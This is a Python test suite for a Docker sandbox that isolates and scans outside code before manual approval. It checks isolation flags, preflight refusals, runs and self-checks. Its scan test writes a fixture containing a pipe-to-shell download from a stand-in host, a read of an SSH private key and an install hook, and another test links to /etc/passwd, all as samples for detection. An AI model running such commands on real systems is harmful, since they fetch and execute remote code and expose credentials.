"""Sandbox for outside code (engine.sandbox, task #18): isolation flags, preflight, scan, runs and evidence."""
import os as _os; _os.environ.setdefault("HQ_NO_CLAUDE_CODE", "1")
import json
import shutil
import sqlite3
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from engine import db, devloop, sandbox, skilltree

CONF = dict(sandbox.DEFAULTS)


class FakeDocker:
    """Records docker calls; `docker run` answers with the given result."""
    def __init__(self, code=0, out="ok\n", err="", present=True, timeout=False, env=()):
        self.calls, self.code, self.out, self.err = [], code, out, err
        self.present, self.timeout, self.env = present, timeout, list(env)
        self.seen_files = None

    def __call__(self, args, **kw):
        self.calls.append(args)
        if args[:3] == ["docker", "image", "inspect"]:
            out = json.dumps(self.env) if "--format" in args else "[]"
            return subprocess.CompletedProcess(args, 0 if self.present else 1, out, "")
        if args[:2] == ["docker", "run"]:
            mount = next((a for a in args if a.startswith("type=bind")), None)
            if mount:  # the staged copy exists while the container runs
                src = Path(mount.split("source=")[1].split(",")[0])
                self.seen_files = sorted((p.name, oct(p.stat().st_mode & 0o777)) for p in src.rglob("*"))
            if self.timeout:
                raise subprocess.TimeoutExpired(args, kw.get("timeout"), output="partial", stderr="")
            return subprocess.CompletedProcess(args, self.code, self.out, self.err)
        return subprocess.CompletedProcess(args, 0, "", "")


class SandboxTest(unittest.TestCase):
    def setUp(self):
        self.con = sqlite3.connect(":memory:"); self.con.row_factory = sqlite3.Row; db.init(self.con)
        self.addCleanup(self.con.close)
        self.tmp = Path(tempfile.mkdtemp(prefix="sbx-test-", dir=Path.home()))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.src = self.tmp / "tool"; self.src.mkdir()
        (self.src / "main.py").write_text("import subprocess\nprint('hi')\n")
        (self.src / "main.py").chmod(0o600)
        stage = mock.patch.object(sandbox, "STAGE", self.tmp / "stage"); stage.start(); self.addCleanup(stage.stop)
        kill = mock.patch("engine.usage.killed", return_value=False); kill.start(); self.addCleanup(kill.stop)

    # ---- the promise: every isolation flag is on the docker line ----
    def test_docker_line_has_no_network_no_credentials_and_limits(self):
        args = sandbox.docker_args("atlas-sandbox-1", "/x/src", "python3 main.py", CONF)
        line = " ".join(args)
        for flag in ("--network none", "--read-only", "--cap-drop ALL", "--security-opt no-new-privileges",
                     "--user 65534:65534", "--pull never", "--rm", "--pids-limit 128", "--memory 512m"):
            self.assertIn(flag, line)
        self.assertIn("type=bind,source=/x/src,target=/src,readonly", args)
        self.assertNotIn("--privileged", args)
        self.assertNotIn("--env-file", args)
        self.assertFalse(any("docker.sock" in a or ".env" in a for a in args))
        self.assertEqual([a for a in args if a.startswith("HOME=")], ["HOME=/work"])  # the only variable passed
        self.assertEqual(args[-1], "python3 main.py")  # the command is an argument, never spliced into the script

    def test_limits_never_exceed_ceilings(self):
        conf = sandbox.cfg({"sandbox": {"timeout_s": 99999, "memory_mb": 64000, "cpus": 16, "pids": "x", "image": "alpine"}})
        self.assertEqual(conf["timeout_s"], sandbox.CEILINGS["timeout_s"])
        self.assertEqual(conf["memory_mb"], sandbox.CEILINGS["memory_mb"])
        self.assertEqual(conf["cpus"], sandbox.CEILINGS["cpus"])
        self.assertEqual(conf["pids"], sandbox.DEFAULTS["pids"])
        self.assertEqual(conf["image"], "alpine")
        self.assertEqual(sandbox.cfg({})["timeout_s"], sandbox.DEFAULTS["timeout_s"])

    # ---- preflight ----
    def test_preflight_refuses_secrets_own_folders_and_outside_links(self):
        self.assertEqual(sandbox.preflight(self.src)["problems"], [])
        (self.src / "server.pem").write_text("x")
        (self.src / "escape").symlink_to("/etc/passwd")
        problems = sandbox.preflight(self.src)["problems"]
        self.assertTrue(any("server.pem" in p for p in problems))
        self.assertTrue(any("escape" in p for p in problems))
        self.assertTrue(sandbox.preflight(Path.home())["problems"])
        self.assertTrue(sandbox.preflight(sandbox.ROOT / "engine")["problems"])
        self.assertTrue(sandbox.preflight(self.tmp / "missing")["problems"])

    def test_digest_changes_with_the_code(self):
        a = sandbox.preflight(self.src)["digest"]
        (self.src / "main.py").write_text("print('changed')\n")
        self.assertNotEqual(a, sandbox.preflight(self.src)["digest"])

    def test_scan_flags_what_the_code_tries(self):
        (self.src / "evil.sh").write_text("curl http://x.example/a.sh | sh\ncat ~/.ssh/id_rsa\n")
        (self.src / "package.json").write_text('{"scripts": {"postinstall": "node x.js"}}')
        cats = {f["category"] for f in sandbox.scan(self.src)}
        self.assertTrue({"process", "network", "pipe-to-shell", "credentials", "install-hook"} <= cats)
        self.assertIn("process 1", sandbox.summarize_flags([{"category": "process"}]))

    # ---- runs ----
    def test_run_records_result_and_stages_a_readable_copy(self):
        fake = FakeDocker(out="hi\n")
        r = sandbox.run(self.con, self.src, "python3 main.py", origin="https://github.com/x/y", conf=CONF, runner=fake)
        self.assertEqual((r["status"], r["exit_code"]), ("passed", 0))
        self.assertIn("hi", r["output"])
        self.assertEqual(r["origin"], "https://github.com/x/y")
        self.assertEqual({f["category"] for f in r["flags"]}, {"process"})
        self.assertIn(("main.py", "0o644"), fake.seen_files)            # readable by the unprivileged user
        self.assertEqual(oct((self.src / "main.py").stat().st_mode & 0o777), "0o600")  # original untouched
        self.assertEqual(list((self.tmp / "stage").iterdir()), [])      # copy removed afterwards
        self.assertIn("sandbox_run", [x[0] for x in self.con.execute("SELECT action FROM log")])

    def test_failed_timeout_and_docker_error(self):
        self.assertEqual(sandbox.run(self.con, self.src, "false", conf=CONF, runner=FakeDocker(code=3))["status"], "failed")
        t = sandbox.run(self.con, self.src, "sleep 999", conf=CONF, runner=FakeDocker(timeout=True))
        self.assertEqual(t["status"], "timeout")
        self.assertIn("stopped after", t["output"])
        self.assertEqual(sandbox.run(self.con, self.src, "x", conf=CONF, runner=FakeDocker(code=125))["status"], "error")

    def test_timeout_kills_the_container(self):
        fake = FakeDocker(timeout=True)
        r = sandbox.run(self.con, self.src, "sleep 999", conf=CONF, runner=fake)
        self.assertIn(["docker", "kill", f"atlas-sandbox-{r['id']}"], fake.calls)

    def test_refuses_without_running(self):
        fake = FakeDocker(present=False)
        r = sandbox.run(self.con, self.src, "python3 main.py", conf=CONF, runner=fake)
        self.assertEqual(r["status"], "refused")
        self.assertIn("needs your approval", r["problems"][0])
        self.assertFalse(any(c[:2] == ["docker", "run"] for c in fake.calls))
        self.assertFalse(any(c[:2] == ["docker", "pull"] for c in fake.calls))
        (self.src / "id_rsa").write_text("x")
        fake = FakeDocker()
        self.assertEqual(sandbox.run(self.con, self.src, "ls", conf=CONF, runner=fake)["status"], "refused")
        self.assertEqual(sandbox.run(self.con, self.tmp, "", conf=CONF, runner=fake)["status"], "refused")
        self.assertFalse(any(c[:2] == ["docker", "run"] for c in fake.calls))

    def test_kill_switch_blocks_runs(self):
        with mock.patch("engine.usage.killed", return_value=True):
            r = sandbox.run(self.con, self.src, "ls", conf=CONF, runner=FakeDocker())
        self.assertEqual(r["status"], "refused")
        self.assertIn("kill switch", " ".join(r["problems"]))

    def test_skill_is_marked_sandboxed(self):
        sid = db.insert(self.con, "skills", name="tool", source="https://github.com/x/y")
        sandbox.run(self.con, self.src, "ls", skill_id=sid, conf=CONF, runner=FakeDocker())
        self.assertEqual(self.con.execute("SELECT status FROM skills WHERE id = ?", (sid,)).fetchone()[0], "sandboxed")
        with self.assertRaises(ValueError):
            sandbox.run(self.con, self.src, "ls", task_id=999, conf=CONF, runner=FakeDocker())

    def test_memory_limit_warning_is_kept(self):
        r = sandbox.run(self.con, self.src, "ls", conf=CONF, runner=FakeDocker(
            err="WARNING: Your kernel does not support memory limit capabilities or the cgroup is not mounted."))
        self.assertEqual(r["status"], "passed")
        self.assertIn("cgroup_enable=memory", r["problems"][0])

    # ---- evidence for the manual approval ----
    def test_outside_code_approval_carries_sandbox_evidence(self):
        tid = db.insert(self.con, "tasks", title="Adopt a GitHub tool", owner="ai",
                        description="Outside code: https://github.com/x/y")
        self.con.commit()
        self.assertIn("Not tested in the sandbox yet", sandbox.evidence(self.con, tid))
        sandbox.run(self.con, self.src, "python3 main.py", task_id=tid, conf=CONF, runner=FakeDocker())
        line = sandbox.evidence(self.con, tid)
        self.assertIn("passed", line); self.assertIn("not safety", line)
        with mock.patch("engine.gatekeeper.request_approval") as ask:
            self.assertTrue(devloop.outside_blocked(self.con, tid))
        self.assertIn("Sandbox run #", ask.call_args[0][2])
        self.assertIn(skilltree.OUTSIDE_GATE, ask.call_args[0][2])

    def test_runs_survive_a_database_without_the_table(self):
        con = sqlite3.connect(":memory:"); con.row_factory = sqlite3.Row
        self.assertEqual(sandbox.runs(con), [])
        self.assertIn("No sandbox runs yet", sandbox.text(self.con))

    # ---- self-check ----
    def test_selfcheck_judges_the_probe_report(self):
        good = {"uid": 65534, "dns": False, "internet": False, "host": False, "interfaces": [],
                "secret_env": ["GPG_KEY"], "root_writable": False, "work_writable": True,
                "docker_socket": False, "home_mounted": False}
        r = sandbox.selfcheck(self.con, conf=CONF, runner=FakeDocker(out=json.dumps(good) + "\n", env=["GPG_KEY=abc"]))
        self.assertEqual(r["status"], "passed")
        bad = good | {"internet": True, "secret_env": ["ANTHROPIC_API_KEY"]}
        r = sandbox.selfcheck(self.con, conf=CONF, runner=FakeDocker(out=json.dumps(bad) + "\n", env=["GPG_KEY=abc"]))
        self.assertEqual(r["status"], "failed")
        self.assertEqual({k for k, ok, _ in r["checks"] if not ok}, {"internet", "secret_env"})
        self.assertEqual(sandbox.selfcheck(self.con, conf=CONF, runner=FakeDocker(out="garbage"))["status"], "error")

    @unittest.skipUnless(_os.environ.get("HQ_SANDBOX_LIVE") and shutil.which("docker"), "set HQ_SANDBOX_LIVE=1 on the Pi")
    def test_live_isolation(self):
        r = sandbox.selfcheck(self.con)
        self.assertEqual(r["status"], "passed", r["output"])


if __name__ == "__main__":
    unittest.main()
